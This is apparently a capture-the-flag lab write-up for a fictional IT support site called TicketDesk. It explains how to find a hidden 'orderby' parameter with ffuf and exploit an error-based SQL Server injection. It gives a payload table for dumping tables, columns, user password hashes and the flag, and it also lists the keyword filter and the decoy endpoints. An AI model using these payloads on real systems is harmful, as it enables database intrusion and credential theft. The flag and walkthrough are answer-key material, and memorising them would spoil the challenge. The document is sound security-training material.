# TicketDesk (`/desk/`)

- **Difficulty:** Hard
- **Engine:** Microsoft SQL Server 2022 (database `ticketdesk`)
- **Technique:** error-based SQL injection in the ORDER BY context of a HIDDEN parameter `orderby` on `GET /desk/api/tickets` (UNION is not possible there)
- **Flag table:** `service_accounts` (flag is in the `secret` column of the `svc_join` row)
- **Site:** fully public IT support site (no login, no tokens). Pages are HTML shells that call a public JSON API from small inline scripts.

## Where the injection is

`GET /desk/api/tickets?orderby=<expr>`. Only when `orderby` is present, its value is concatenated into `... ORDER BY <expr> OFFSET ... FETCH NEXT 10 ROWS ONLY`, and a database failure then returns HTTP 500 with the engine message in the JSON field `detail`. Without the parameter, no database error text is ever shown.
The UI never sends `orderby` and nothing in the HTML/JS references it.

Pre-filter on `orderby` (HTTP 400 "Invalid ordering"): length > 250, `;`, `--`, `/*`, and the words `union`, `waitfor`, `exec`, `xp_`, `insert`, `update`, `delete`, `drop`, `shutdown`.

## How a tester finds it

1. Browse: the pages call `/desk/api/tickets?status=..&page=..`, `/desk/api/ticket?id=`, `/desk/api/kb?q=`, `/desk/api/agents?team=`, `/desk/api/stats?period=` (visible in the page source).
2. Fuzz parameter names on the list endpoint. Baseline `GET /desk/api/tickets` is 200 and a fixed size (1694 bytes in the stock data); unknown params are ignored, so filter on that size:
   `ffuf -u 'http://HOST:5050/desk/api/tickets?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1694`
   Hits: `status`, `priority`, `q` (visible, validated - 400s / different size) and `orderby` (200, different size because the response now carries an `order_by` field).
3. `orderby=foo` -> 500 with `detail: "Invalid column name 'foo'."`: the value is being used as SQL. `orderby=1` works (orders by the first column). `orderby=1 union select 1` -> 400 (filtered, and UNION is not valid in ORDER BY anyway), so use error-based extraction.

Quirk: an uncorrelated constant subquery such as `(SELECT CAST(@@version AS int))` is folded away by the optimiser and never raises. Use the bare `CAST(@@version AS int)`, or a subquery that reads a table. Make sure the other filters (`status`, `q`...) still match at least one ticket, otherwise no row is evaluated and no error occurs.

## Exploitation

Send each payload as `orderby` (URL-encode it). The data appears in `detail`: `Conversion failed when converting the nvarchar value '<DATA>' to data type int.`

| Goal | `orderby` value |
|---|---|
| Version | `CAST(@@version AS int)` |
| Current DB | `CAST(DB_NAME() AS int)` |
| Tables | `CAST((SELECT STRING_AGG(name,CHAR(44)) FROM sys.tables) AS int)` |
| Tables (one at a time) | `(SELECT TOP 1 CAST(name AS int) FROM sys.tables WHERE name NOT IN ('users'))` and extend the NOT IN list |
| Columns of `service_accounts` | `CAST((SELECT STRING_AGG(name,CHAR(44)) FROM sys.columns WHERE object_id=OBJECT_ID('service_accounts')) AS int)` |
| Same via information_schema | `CAST((SELECT STRING_AGG(column_name,CHAR(44)) FROM information_schema.columns WHERE table_name='service_accounts') AS int)` |
| Dump rows + flag | `CAST((SELECT STRING_AGG(CONCAT(system_name,CHAR(58),account,CHAR(58),secret),CHAR(124)) FROM service_accounts) AS int)` |
| Flag only | `(SELECT TOP 1 CAST(secret AS int) FROM service_accounts WHERE account='svc_join')` |
| Users | `CAST((SELECT STRING_AGG(CONCAT(username,CHAR(58),password_hash),CHAR(124)) FROM users) AS int)` |

If STRING_AGG output is too long, use `SELECT TOP 1 ... WHERE id=N` and walk the rows.

Flag: `FLAG{ticketdesk_amber_lantern_7c41}`

## Tables in the database
`users` (dummy hashes), `categories`, `tickets`, `comments`, `assets`, `knowledge_base`, `api_keys` (fake keys), `audit_log`, `tickets_archive`, `contact_messages`, `service_accounts` (flag).

## Hidden endpoints (found by ffuf, none are linked anywhere, none are injectable)

`ffuf -u 'http://HOST:5050/desk/api/FUZZ' -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404` (also works with `raft-small-words.txt`) finds, besides the visible `agents`, `kb`, `stats`, `ticket`, `tickets`:
- `/desk/api/assets` : `?tag=` is bound, `?sort=` is mapped through a whitelist dictionary (400 "Unknown sort field"). A second `sort`-style parameter that looks promising but is dead.
- `/desk/api/categories` : static list.
- `/desk/api/users` : `?id=` digits only, bound; returns no hashes.
- `/desk/api/export` : `?id=` digits only, `?format=` whitelist (json/csv).
- `/desk/api/health` : static `{"status":"ok"}`.
- `/desk/api/reports`, `/desk/api/config`, `/desk/api/internal/...` : static 403 JSON. `/desk/api/v1/...` : 410 retired.
- `/desk/admin`, `/desk/backup` (`ffuf -u .../desk/FUZZ -w dirb/common.txt -fc 404`) : static 403 HTML.

## Other rabbit holes (all safe)
- Visible: `/desk/api/ticket?id=` (digits only, bound; quote -> generic 400), `/desk/api/kb?q=` (bound LIKE; quote -> empty list), `/desk/api/agents?team=` (bound; unknown team -> empty list), `/desk/api/stats?period=` (whitelist 7d/30d/90d/1y/all; anything else 400).
- `status`, `priority`, `q`, `page` on `/desk/api/tickets`: whitelist / regex validation, always a generic 400 "Invalid ...", no database detail. They look injectable and are not.
- `/desk/status` (static "all systems operational"), `/desk/contact` (parameterised insert), `/desk/about`.
- Decoy tables `api_keys`, `audit_log`, `tickets_archive`, plus the many fake service account passwords next to the flag.
